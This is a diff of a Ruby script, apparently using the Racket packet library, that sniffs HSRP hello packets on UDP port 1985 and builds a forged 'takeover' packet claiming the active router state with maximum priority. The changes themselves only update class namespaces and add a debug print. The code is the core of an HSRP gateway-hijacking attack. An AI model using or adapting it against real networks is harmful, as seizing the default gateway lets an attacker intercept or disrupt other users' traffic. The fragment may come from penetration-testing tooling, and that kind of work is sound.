@@ -33,25 +33,26 @@ end
 
 # prep our new takeover.  
 takeover = Racket::Racket.new
-takeover.l3 = IPv4.new
+takeover.l3 = L3::IPv4.new
 takeover.l3.src_ip = router 
 takeover.l3.dst_ip = "224.0.0.2"
 takeover.l3.protocol = 17 
-takeover.l4 = UDP.new
+takeover.l4 = L4::UDP.new
 takeover.l4.src_port = 1985
 takeover.l4.dst_port = 1985
 
 p.each do |pkt|
   if (p.datalink == Pcap::DLT_EN10MB) 
-    eth = Ethernet.new(pkt)
+      puts "Found ethernet"
+    eth = L2::Ethernet.new(pkt)
     if (eth.ethertype == 0x0800)
-      ip = IPv4.new(eth.payload)
+      ip = L3::IPv4.new(eth.payload)
       if (ip.protocol == 17) 
-        udp = UDP.new(ip.payload)
+        udp = L4::UDP.new(ip.payload)
         if (udp.src_port == 1985 && udp.dst_port == 1985)
-          takeover.l5 = HSRP.new(udp.payload)
-          takeover.l5.opcode = HSRP::HSRP_HELLO
-          takeover.l5.state = HSRP::HSRP_ACTIVE
+          takeover.l5 = L5::HSRP.new(udp.payload)
+          takeover.l5.opcode = L5::HSRP::HSRP_HELLO
+          takeover.l5.state = L5::HSRP::HSRP_ACTIVE
           takeover.l5.priority = 0xffff
          
           takeover.l4.payload = takeover.l5
